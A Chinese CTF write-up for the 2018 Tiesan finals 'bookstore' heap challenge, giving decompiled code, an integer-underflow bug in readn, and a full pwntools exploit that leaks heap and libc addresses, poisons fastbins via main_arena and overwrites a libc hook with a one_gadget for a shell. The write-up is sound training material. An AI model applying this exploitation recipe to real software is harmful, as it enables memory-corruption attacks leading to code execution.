# 铁三总决赛2018 bookstore
## Author: Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这题相比第一题littlenote稍微难一点点，但只要发现了readn中的整形溢出漏洞也一样可以很轻易的做出这题了。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>套路还是老套路，用了scanf中的malloc_consolidate技巧，创建重叠堆块，然后我用了fastbin to main_arena修改top堆块指针来达到expolit的，demo可以找找之前的how2pwn。先看看IDA伪代码：</font></br>

**main**

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char s; // [rsp+0h] [rbp-10h]

  init();
  puts("Welcome to have-everything-but-book bookstore!");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();                               //   puts("1.add a book");
                                                //   puts("2.sell a book");
                                                //   puts("3.read a book");
                                                //   puts("4.exit");
                                                //   return puts("Your choice:");
          memset(&s, 0, 0x10uLL);
          read(0, &s, 0x10uLL);
          v3 = atoi(&s);
          if ( v3 != 2 )
            break;
          sellbook();
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_13;
        add_book();
      }
      if ( v3 != 3 )
        break;
      readbook();
    }
    if ( v3 == 4 )
      break;
LABEL_13:
    puts("Invalid choice");
  }
  puts("Bye!");
  return 0;
}
```

**add_book**
```C
int add_book()
{
  size_t size; // [rsp+8h] [rbp-8h]

  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0xF && link[5 * HIDWORD(size)]; ++HIDWORD(size) )
    ;
  if ( HIDWORD(size) == 16 )
    puts("Too many books");
  puts("What is the author name?");
  readn(40LL * HIDWORD(size) + 0x602060, 31);
  puts("How long is the book name?");
  _isoc99_scanf("%u", &size);
  if ( (unsigned int)size > 0x50 )
    return puts("Too big!");
  link[5 * HIDWORD(size)] = malloc((unsigned int)size);
  puts("What is the name of the book?");
  readn(link[5 * HIDWORD(size)], size);
  return puts("Done!");
}
```

**readn**

```C
//如果传入的参数size=0
//result=0-1=0xffffffffffffffff
//相当于可以写入任意字节大小
__int64 __fastcall readn(__int64 chunk, int size)
{
  __int64 result; // rax
  unsigned int v3; // eax
  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h]
  unsigned int v5; // [rsp+1Ch] [rbp-4h]

  v5 = 0;
  while ( 1 )
  {
    result = (unsigned int)(size - 1);
    if ( (unsigned int)result <= v5 )
      break;
    read(0, &buf, 1uLL);
    result = buf;
    if ( buf == '\n' )
      break;
    v3 = v5++;
    *(_BYTE *)(chunk + v3) = buf;
  }
  return result;
}
```

**sellbook**

```C
int sellbook()
{
  unsigned int index; // [rsp+Ch] [rbp-4h]

  puts("Which book do you want to sell?");
  _isoc99_scanf("%u", &index);
  if ( index > 0x10 )
    return puts("Out of bound!");
  if ( !link[5 * index] )
    return puts("No such book!");
  free((void *)link[5 * index]);
  link[5 * index] = 0LL;
  return puts("Done!");
}
```

**readbook**

```C
int readbook()
{
  unsigned int index; // [rsp+Ch] [rbp-4h]

  puts("Which book do you want to sell?");
  _isoc99_scanf("%u", &index);
  if ( index > 0x10 )
    return puts("Out of bound!");
  if ( link[5 * index] )
    return printf("Author:%s\nBookname:%s\n", 40LL * index + 0x602060, link[5 * index]);
  return puts("No such book!");
}
```


&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以漏洞就在readn函数里，我写在注释里了，接下来就是常规利用了，还是不想多讲了，都一样。直接放脚本了：</font></br>

```python
from pwn import *

context.log_level=1

p=process('./bookstore')
elf=ELF('./libc_64.so')

chunk_base=0
libc_base=0
one_gadget=0x4526a

sd=lambda x:p.send(x)
sl=lambda x:p.sendline(x)
rv=lambda x:p.recvuntil(x)
sa=lambda a,x:p.sendafter(a,x)
sla=lambda a,x:p.sendlineafter(a,x)

menu='Your choice:\n'

def add(length,bname='',aname=''):
    sla(menu,'1')
    sla('What is the author name?\n',aname)
    sla('How long is the book name?\n',str(length))
    sla('What is the name of the book?\n',bname)

def dele(index):
    sla(menu,'2')
    sla('Which book do you want to sell?\n',str(index))

def show(index,content=''):
    sla(menu,'3')
    if len(content)==0:
        sla('Which book do you want to sell?\n',str(index))
    else:
        sla('Which book do you want to sell?\n',content)

def z():
    log.info('chunk base:'+hex(chunk_base))
    gdb.attach(p)

add(0)      #0
add(0)      #1
add(0)      #2

dele(2)
dele(1)
dele(0)

add(0)      #0
show(0)
rv('Bookname:')
chunk_base=u32(p.recv(4))-0x20

add(0,p64(0)*3+p64(0x21)+p64(chunk_base))      #1
add(0)                                         #2

add(0)      #3
dele(3)

for i in range(6):
    add(0x38)   #3-8

for i in range(3,8):
    dele(i)

show(0,'1'*0x400)

show(0)
rv('Bookname:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4ba8
log.info('libc base:'+hex(libc_base))

add(0)      #3
add(0)      #4

dele(4)
dele(3)

add(0,p64(0)*3+p64(0x21)+p64(0x61)) #3
add(0)                              #4
evil_addr=libc_base+0x3c4b20

add(0x50)   #5
dele(4)
dele(5)

payload=p64(0)*7+p64(0x61)+p64(evil_addr)
add(0,payload)  #4


add(0x50) #5
add(0x50,p64(0)*9+p64(libc_base+0x3c4ae8)) #6

add(0x30)
add(0x30)
add(0x50)   
add(0x50,p64(0)*3+p64(libc_base+one_gadget))   

sla(menu,'1')
sla('What is the author name?\n','wenhuo')
sla('How long is the book name?\n','23')
 

p.interactive()

```